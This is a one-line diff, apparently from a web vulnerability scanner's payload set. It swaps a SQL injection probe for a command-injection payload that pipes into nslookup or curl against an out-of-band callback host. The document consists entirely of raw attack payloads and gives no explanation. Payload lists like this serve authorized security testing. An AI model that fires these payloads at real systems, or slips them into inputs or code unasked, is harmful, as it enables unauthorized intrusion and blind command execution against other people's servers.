@@ -1,1 +1,1 @@
--1" OR 3*2<(0+5+127-127) -- 
+|(nslookup -q=cname hitqojkmdtmhzafba4.bxss.me||curl hitqojkmdtmhzafba4.bxss.me)
